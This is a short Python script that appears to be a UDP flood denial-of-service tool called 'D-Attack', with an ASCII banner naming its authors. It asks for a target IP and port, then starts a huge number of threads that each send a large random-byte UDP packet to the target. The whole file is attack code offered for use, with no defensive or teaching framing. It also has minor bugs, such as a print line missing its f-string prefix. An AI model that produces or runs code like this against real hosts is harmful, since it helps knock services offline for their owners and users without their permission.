#!/usr/bin/env python3

import threading, socket, time, random

__banner__ = """
 ______       _______ _______ _______ _______ ______  _     _
 |     \  ___ |_____|    |       |    |_____| |       |____/ 
 |_____/      |     |    |       |    |     | |_____  |    \_
 —————————————————————————————————————————————————————————————
 []xxxxx[]:::::::::::::::::::::> <:::::::::::::::::::[]xxxxx[]
 |               Author: Stephin-Franklin                    |
 |           with the contribution of: Paxv28                |
 []xxxxx[]:::::::::::::::::::::> <:::::::::::::::::::[]xxxxx[]
"""

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

class DAttack:
    def __init__(self, ip, port):
        self.packet = str(random._urandom(90000)).encode('utf-8')

        self.ip = ip
        self.port = port

        self.nAttacks = 100000000
        self.all_threads = []

    def Attack(self):
        try:
            s.sendto(self.packet, (self.ip, int(self.port)))
            print("[ ! ] Attacking... {self.ip} in Port {self.port}")
        except socket.error:
            print("[ ! ] No Connection!, Target may be down.")
            s.close()

        exit(0)

    def SendAttack(self):
        try:
            for i in range(1, self.nAttacks):
                th = threading.Thread(target=self.Attack)
                th.daemon = True
                th.start()
                self.all_threads.append(th)

                time.sleep(0.01)
            
            for i in self.all_threads:
                i.join()

        except RuntimeError:
            exit(0)

def main():
    print(__banner__)
    target = input(" [ * ] Target IP : ")
    port = input(" [ * ] Target Port : ")

    DAtk = DAttack(target, port)
    DAtk.SendAttack()

if __name__ == '__main__':
    main()
